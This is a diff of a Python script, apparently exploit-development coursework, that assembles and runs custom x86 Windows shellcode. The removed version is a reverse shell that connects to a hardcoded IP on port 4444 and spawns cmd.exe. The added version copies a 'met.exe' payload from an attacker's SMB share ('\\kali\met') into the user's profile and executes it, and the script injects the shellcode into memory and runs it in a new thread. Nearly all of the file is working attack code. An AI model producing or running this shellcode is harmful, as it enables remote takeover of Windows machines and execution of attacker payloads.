@@ -1,66 +1,62 @@
-#!/usr/bin/python
-
 import ctypes, struct
 from keystone import *
 
 CODE = (
-    " start:                             "  #
-    "   mov   ebp, esp                  ;"  #
-    "   add   esp, 0xfffff9f0           ;"  #   Avoid NULL bytes for sub esp, 0x200.
+   ###### BEGIN COMMON PART FROM MATERIALS ######
+    " start:                             "
+    # "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
+    "   mov   ebp, esp                  ;"
+    "   add   esp, 0xfffff9f0           ;"  #   Avoid NULL bytes
 
-    " find_kernel32:                     "  #
-    "   xor   ecx, ecx                  ;"  # ECX = 0
-    "   mov   esi,fs:[ecx+30h]          ;"  # ESI = &(PEB) ([FS:0x30])
-    "   mov   esi,[esi+0Ch]             ;"  # ESI = PEB->Ldr
-    "   mov   esi,[esi+1Ch]             ;"  # ESI = PEB->Ldr.InInitOrder
+    " find_kernel32:                     "
+    "   xor   ecx, ecx                  ;"  #   ECX = 0
+    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
+    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
+    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder
 
-    " next_module:                      "  #
-    "   mov   ebx, [esi+8h]             ;"  # EBX = InInitOrder[X].base_address
-    "   mov   edi, esi                  ;"  # EDI = InInitOrder[X].module_name
-    "   add   edi, 0x10;"
-    "   add   edi, 0x10;"
-    "   mov   edi, [edi]            ;"  # EDI = InInitOrder[X].module_name
-    "   mov   esi, [esi]                ;"  # ESI = InInitOrder[X].flink (next)
-    "   cmp   [edi+12*2], cx            ;"  # (unicode) modulename[12] == 0x00?
-    "   jne   next_module               ;"  # No: try next module.
-    
-    " find_function_shorten:             "  #
+    " next_module:                       "
+    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
+    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
+    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
+    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00 ?
+    "   jne   next_module               ;"  #   No: try next module
+
+    " find_function_shorten:             "
     "   jmp find_function_shorten_bnc   ;"  #   Short jump
 
-    " find_function_ret:                 "  #
+    " find_function_ret:                 "
     "   pop esi                         ;"  #   POP the return address from the stack
     "   mov   [ebp+0x04], esi           ;"  #   Save find_function address for later usage
-    "   jmp resolve_symbols_kernel32    ;"  #
+    "   jmp resolve_symbols_kernel32    ;"
 
     " find_function_shorten_bnc:         "  #   
     "   call find_function_ret          ;"  #   Relative CALL with negative offset
 
-    " find_function:                     "  #
-    "   pushad                          ;"  # Save all registers
-    "   mov   eax, [ebx+0x3c]           ;"  # Offset to PE Signature
-    "   mov   edi, [ebx+eax+0x78]       ;"  # Export Table Directory RVA
-    "   add   edi, ebx                  ;"  # Export Table Directory VMA
-    "   mov   ecx, [edi+0x18]           ;"  # NumberOfNames
-    "   mov   eax, edi           ;"  # AddressOfNames RVA
-    "   add   al,0x10           ;"
-    "   mov   eax, [eax+0x10]           ;"  # AddressOfNames RVA
+    " find_function:                     "
+    "   pushad                          ;"  #   Save all registers
+                                            #   Base address of kernel32 is in EBX from 
+                                            #   Previous step (find_kernel32)
+    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
+    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA
+    "   add   edi, ebx                  ;"  #   Export Table Directory VMA
+    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
+    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA
+    "   add   eax, ebx                  ;"  #   AddressOfNames VMA
+    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later
 
-    "   add   eax, ebx                  ;"  # AddressOfNames VMA
-    "   mov   [ebp-4], eax              ;"  # Save AddressOfNames VMA for later
+    " find_function_loop:                "
+    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
+    "   dec   ecx                       ;"  #   Decrement our names counter
+    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
+    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
+    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name
 
-    " find_function_loop:                "  #
-    "   jecxz find_function_finished    ;"  # Jump to the end if ECX is 0
-    "   sub ecx, 0x01                       ;"  # Decrement our names counter
-    "   mov   eax, [ebp-4]              ;"  # Restore AddressOfNames VMA
-    "   mov   esi, [eax+ecx*4]          ;"  # Get the RVA of the symbol name
-    "   add   esi, ebx                  ;"  # Set ESI to the VMA of the current symbol name
-    
-    " compute_hash:                      "  #
+    " compute_hash:                      "
     "   xor   eax, eax                  ;"  #   NULL EAX
     "   cdq                             ;"  #   NULL EDX
     "   cld                             ;"  #   Clear direction
 
-    " compute_hash_again:                "  #
+    " compute_hash_again:                "
     "   lodsb                           ;"  #   Load the next byte from esi into al
     "   test  al, al                    ;"  #   Check for NULL terminator
     "   jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
@@ -68,9 +64,9 @@ CODE = (
     "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
     "   jmp   compute_hash_again        ;"  #   Next iteration
 
-    " compute_hash_finished:             "  #
+    " compute_hash_finished:             "
 
-    " find_function_compare:             "  #
+    " find_function_compare:             "
     "   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the requested hash
     "   jnz   find_function_loop        ;"  #   If it doesn't match go back to find_function_loop
     "   mov   edx, [edi+0x24]           ;"  #   AddressOfNameOrdinals RVA
@@ -82,103 +78,113 @@ CODE = (
     "   add   eax, ebx                  ;"  #   Get the function VMA
     "   mov   [esp+0x1c], eax           ;"  #   Overwrite stack version of eax from pushad
 
-    " find_function_finished:            "  #
-    "   popad                           ;"  # Restore registers
-    "   ret                             ;"  #
-    
-    " resolve_symbols_kernel32:              "
+    " find_function_finished:            "
+    "   popad                           ;"  #   Restore registers
+    "   ret                             ;"
+
+    " resolve_symbols_kernel32:          "
     "   push  0x78b5b983                ;"  #   TerminateProcess hash
     "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
     "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later usage
+
     "   push  0xec0e4e8e                ;"  #   LoadLibraryA hash
     "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
     "   mov   [ebp+0x14], eax           ;"  #   Save LoadLibraryA address for later usage
+
+    ###### END PART FROM MATERIALS ######
+
+    ###### LOADING CUSTOM FUNCTIONS FROM KERNEL32.DLL ######
     "   push  0x16b3fe72                ;"  #   CreateProcessA hash
     "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
     "   mov   [ebp+0x18], eax           ;"  #   Save CreateProcessA address for later usage
-    
-    " load_ws2_32:                       "  #
-    "   xor   eax, eax                  ;"  #   Null EAX
-    "   mov   ax, 0x6c6c                ;"  #   Move the end of the string in AX
-    "   push  eax                       ;"  #   Push EAX on the stack with string NULL terminator
-    "   push  0x642e3233                ;"  #   Push part of the string on the stack
-    "   push  0x5f327377                ;"  #   Push another part of the string on the stack
-    "   push  esp                       ;"  #   Push ESP to have a pointer to the string
-    "   call dword ptr [ebp+0x14]       ;"  #   Call LoadLibraryA
-    
-    " resolve_symbols_ws2_32:            "
-    "   mov   ebx, eax                  ;"  #   Move the base address of ws2_32.dll to EBX
-    "   push  0x3bfcedcb                ;"  #   WSAStartup hash
+
+    "   push  0xcb73463b                ;"  #   lstrcatA hash
     "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
-    "   mov   [ebp+0x1C], eax           ;"  #   Save WSAStartup address for later usage
-    "   push  0xadf509d9                ;"  #   WSASocketA hash
+    "   mov   [ebp+0x1C], eax           ;"  #   Save lstrcatA address for later usage
+
+    "   push  0x7ee258e7                ;"  #   CopyFileExA hash
     "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
-    "   mov   [ebp+0x24], eax           ;"  #   Save WSASocketA address for later usage
-    "   push  0xb32dba0c                ;"  #   WSAConnect hash
+    "   mov   [ebp+0x20], eax           ;"  #   Save CopyFileExA address for later usage
+
+    ###### LOADING CUSTOM FUNCTIONS FROM ADVAPI32.DLL ######
+    " load_advapi32:                     "
+    "   xor   eax, eax                  ;"  #   NULL EAX
+    "   push  eax                       ;"
+    "   push  0x6c6c642e                ;"
+    "   push  0x32336970                ;"
+    "   push  0x61766461                ;"
+    "   push  esp                       ;"  #   Push "advapi32.dll"
+    "   call  dword ptr [ebp+0x14]      ;"  #   Call LoadLibraryA
+
+    " resolve_symbols_advapi32:          "
+    "   mov   ebx, eax                  ;"  #   Use advapi32.dll
+
+    "   push  0x5c52aa34                ;"  #   GetUserNameA hash
     "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
-    "   mov   [ebp+0x28], eax           ;"  #   Save WSAConnect address for later usage
+    "   mov   [ebp+0x24], eax           ;"  #   Save GetUserNameA address for later usage
+
+    ###### NOW THAT ALL DLL AND FUNCTIONS ARE LOADED, WE CAN CALL EACH FUNCTION
+
+    " allocate_space_destination:        "
+    "   xor   eax,eax                   ;"  #   NULL eax
+    "   mov   al, 0x5c                  ;"  #   \ \00 \00 \00
+    "   push  eax                       ;"
+    "   push  0x73726573                ;"
+    "   push  0x555c3a43                ;"  #   Push on the stack "C:\Users\" (that will be appended later with %USERNAME%)
+    # This is just technique among plenty other, possible to call lstrcatA or other function, but here it is simple to push it manually
+    "   mov   ebx, esp                  ;"  #   Save EBX = ESP
+    "   add   esp, 0xffffff10           ;"  #   Create space for username and met.exe Avoid NULL bytes
+
+    ###### STORE USER PATH INTO EBX
+    " call_GetUserNameA:                 "
+    "   xor eax,eax                     ;"
+    "   mov al, 0x7F                    ;"  #   Set maximum length pcbBuffer (input) as 128
+    "   push eax                        ;"
+    "   push esp                        ;"  #   Push pcbBuffer address
+    "   sub ebx, 0xfffffff7             ;"  #   Pointer to end of existing string (+9 == len("C:\Users\") )
+    "   push ebx                        ;"  #   Push destination buffer
+    "   call dword ptr [ebp+0x24]       ;"  #   Call GetUserNameA
+    "   add ebx, 0xfffffff7             ;"  #   Restore EBX to initial full string
+
+    ###### CONCAT USER PATH AND "\met.exe"
+    " call_lstrcatA:                     "
+    "   xor  eax,eax                    ;"
+    "   push eax                        ;"
+    "   push 0x6578652e                 ;"
+    "   push 0x74656d5c                 ;"
+    "   push esp                        ;"  #   Push "\met.exe"
+    "   push ebx                        ;"  #   Push destination
+    "   call dword ptr [ebp+0x1C]       ;"  #   Call lstrcatA
+
+    ###### MOVE FILE FROM SMB
+    " call_CopyFileExA:                  "
+    "   xor   eax,eax                   ;"  #   NULL eax
+    "   mov   ax, 0x6578                ;"  #   xe\00\00
+    "   push  eax                       ;"
+    "   push  0x652e7465                ;"
+    "   push  0x6d5c7465                ;"
+    "   push  0x6d5c696c                ;"
+    "   push  0x616b5c5c                ;"  #   ESP = "\\kali\met\met.exe"
+    "   lea   esi, [esp]                ;"  #   Save ESP in ESI
     
-    " call_wsastartup:                   "  #
-    "   push esp                        ;"
-    "   pop eax                         ;"
-    "   mov   cx, 0x590                 ;"  #   Move 0x590 to CX
-    "   sub   eax, ecx                  ;"  #   Subtract CX from EAX to avoid overwriting the structure later
-    "   push  eax                       ;"  #   Push lpWSAData
-    "   xor   eax, eax                  ;"  #   Null EAX
-    "   mov   ax, 0x0202                ;"  #   Move version to AX
-    "   push  eax                       ;"  #   Push wVersionRequired
-    "   call dword ptr [ebp+0x1C]       ;"  #   Call WSAStartup
-    
-    " call_wsasocketa:                   "  #
-    "   xor   eax, eax                  ;"  #   Null EAX
-    "   push  eax                       ;"  #   Push dwFlags
-    "   push  eax                       ;"  #   Push g
-    "   push  eax                       ;"  #   Push lpProtocolInfo
-    "   mov   al, 0x06                  ;"  #   Move AL, IPPROTO_TCP
-    "   push  eax                       ;"  #   Push protocol
-    "   sub   al, 0x05                  ;"  #   Subtract 0x05 from AL, AL = 0x01
-    "   push  eax                       ;"  #   Push type
-    "   inc   eax                       ;"  #   Increase EAX, EAX = 0x02
-    "   push  eax                       ;"  #   Push af
-    "   call dword ptr [ebp+0x24]       ;"  #   Call WSASocketA
-    
-    " call_wsaconnect:                   "  #
-    "   mov   esi, eax                  ;"  #   Move the SOCKET descriptor to ESI
-    "   xor   eax, eax                  ;"  #   Null EAX
-    "   push  eax                       ;"  #   Push sin_zero[]
-    "   push  eax                       ;"  #   Push sin_zero[]
-    "   push  0x72dda8c0                ;"  #   Push sin_addr VPN IP
-    "   mov   bx, 0x5c11                ;"  #   Move the sin_port 4444
-    "   shl   ebx, 0x10                 ;"  #   Left shift EBX by 0x10 bytes
-    "   add   bx, 0x02                  ;"  #   Add 0x02 (AF_INET) to AX
-    "   push  ebx                       ;"  #   Push sin_port & sin_family
-    "   push  esp                       ;"  #   Push pointer to the sockaddr_in structure
-    "   pop   edi                       ;"  #   Store pointer to sockaddr_in in EDI
-    "   xor   ebx, ebx                  ;"  #   Null EAX
-    "   xor   eax, eax                  ;"  #   Null EAX
-    "   push  eax                       ;"  #   Push lpGQOS
-    "   push  eax                       ;"  #   Push lpSQOS
-    "   push  eax                       ;"  #   Push lpCalleeData
-    "   push  eax                       ;"  #   Push lpCalleeData
-    "   add   al, 0x10                  ;"  #   Set AL to 0x10
-    "   push  eax                       ;"  #   Push namelen
-    "   push  edi                       ;"  #   Push *name
-    "   push  esi                       ;"  #   Push s
-    "   call dword ptr [ebp+0x28]       ;"  #   Call WSAConnect
-    
-    " create_startupinfoa:               "  # Push all values of a STARTUPINFOA structure onto the stack and store esp.
-    "   push  esi                       ;"  #   Push hStdError ESI contains the socket descriptor.
-    "   push  esi                       ;"  #   Push hStdOutput
-    "   push  esi                       ;"  #   Push hStdInput
-    "   xor   eax, eax                  ;"  #   Null EAX   
+    "   xor   eax,eax                   ;"  #   NULL EAX
+    "   push  eax                       ;"  #   Push dwCopyFlags
+    "   push  eax                       ;"  #   Push pbCancel
+    "   push  eax                       ;"  #   Push lpData
+    "   push  eax                       ;"  #   Push lpProgressRoutine
+    "   push  ebx                       ;"  #   Push destination path
+    "   push  esi                       ;"  #   Push SMB path
+    "   call  dword ptr [ebp+0x20]      ;"  #   Call CopyFileExA
+
+    ####### BASED ON MATERIALS, ALL VALUES TO 0 ######
+    " create_startupinfoa:               "
+    "   xor   eax,eax                   ;"  #   NULL EAX
+    "   push  eax                       ;"  #   Push hStdError
+    "   push  eax                       ;"  #   Push hStdOutput
+    "   push  eax                       ;"  #   Push hStdInput
     "   push  eax                       ;"  #   Push lpReserved2
     "   push  eax                       ;"  #   Push cbReserved2 & wShowWindow
-    "   mov   al, 0x80                  ;"  #   Move 0x80 to AL
-    "   xor   ecx, ecx                  ;"  #   Null ECX
-    "   mov cl, 0x80                    ;"
-    "   add   eax, ecx                  ;"  #   Set EAX to 0x100
     "   push  eax                       ;"  #   Push dwFlags
-    "   xor   eax, eax                  ;"  #   Null EAX   
     "   push  eax                       ;"  #   Push dwFillAttribute
     "   push  eax                       ;"  #   Push dwYCountChars
     "   push  eax                       ;"  #   Push dwXCountChars
@@ -189,22 +195,14 @@ CODE = (
     "   push  eax                       ;"  #   Push lpTitle
     "   push  eax                       ;"  #   Push lpDesktop
     "   push  eax                       ;"  #   Push lpReserved
-    "   mov   al, 0x44                  ;"  #   Move 0x44 to AL
+    "   mov   al, 0x44                  ;"  #   Push size
     "   push  eax                       ;"  #   Push cb
     "   push  esp                       ;"  #   Push pointer to the STARTUPINFOA structure
     "   pop   edi                       ;"  #   Store pointer to STARTUPINFOA in EDI
-    
-    " create_cmd_string:                 "  #
-    "   mov   eax, 0xff9a879b           ;"  #   Move 0xff9a879b into EAX. Null byte pro-tip: put negative value in register and negate it to get zeroes.
-    "   neg   eax                       ;"  #   Negate EAX, EAX = 00657865
-    "   push  eax                       ;"  #   Push part of the "cmd.exe" string
-    "   push  0x2e646d63                ;"  #   Push the remainder of the "cmd.exe" string
-    "   push  esp                       ;"  #   Push pointer to the "cmd.exe" string
-    "   pop   ebx                       ;"  #   Store pointer to the "cmd.exe" string in EBX
-    
-    " call_createprocessa:               "  #
-    "   push esp                        ;"
-    "   pop eax                         ;"
+
+    ####### BASED ON MATERIALS ######
+    " call_createprocessa:               "
+    "   mov   eax, esp                  ;"  #   Move ESP to EAX
     "   xor   ecx, ecx                  ;"  #   Null ECX
     "   mov   cx, 0x390                 ;"  #   Move 0x390 to CX
     "   sub   eax, ecx                  ;"  #   Subtract CX from EAX to avoid overwriting the structure later
@@ -219,15 +217,16 @@ CODE = (
     "   dec   eax                       ;"  #   Null EAX
     "   push  eax                       ;"  #   Push lpThreadAttributes
     "   push  eax                       ;"  #   Push lpProcessAttributes
-    "   push  ebx                       ;"  #   Push lpCommandLine
+    "   push  ebx                       ;"  #   Push lpCommandLine = destination
     "   push  eax                       ;"  #   Push lpApplicationName
     "   call dword ptr [ebp+0x18]       ;"  #   Call CreateProcessA
 
-    " exec_and_wait:                    "
-    "   xor eax, eax                   ;"
-    "   push eax                       ;"
-    "   push 0xFFFFFFFF                ;"
-    "   call dword ptr [ebp+0x10]      ;"  #   Call CreateProcessA
+    ###### EXIT PROPERLY ACCORDING TO MATERIALS ######
+    " exit_properly:                     "
+    "   xor   ecx, ecx                  ;"  #   NULL ECX
+    "   push  ecx                       ;"  #   uExitCode
+    "   push  0xffffffff                ;"  #   hProcess
+    "   call dword ptr [ebp+0x10]       ;"  #   Call TerminateProcess
 )
 
 # Initialize engine in X86-32bit mode
@@ -235,12 +234,32 @@ ks = Ks(KS_ARCH_X86, KS_MODE_32)
 encoding, count = ks.asm(CODE)
 print("Encoded %d instructions..." % count)
 
-sh = ""
-for e in encoding:
-    sh += "\\x{0:02x}".format(int(e)).rstrip("\n")
-    
-print("shellcode = (b\"" + sh + "\")")
 
-f = open("shellcode.bin", "wb")
-f.write(bytearray(encoding))
-f.close()
+sh = b""
+for e in encoding:
+    sh += struct.pack("B", e)
+shellcode = bytearray(sh)
+
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                          ctypes.c_int(len(shellcode)),
+                                          ctypes.c_int(0x3000),
+                                          ctypes.c_int(0x40))
+
+buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+
+ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
+                                     buf,
+                                     ctypes.c_int(len(shellcode)))
+
+print("Shellcode located at address %s" % hex(ptr))
+input("...ENTER TO EXECUTE SHELLCODE...")
+
+ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+                                         ctypes.c_int(0),
+                                         ctypes.c_int(ptr),
+                                         ctypes.c_int(0),
+                                         ctypes.c_int(0),
+                                         ctypes.pointer(ctypes.c_int(0)))
+
+ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
+
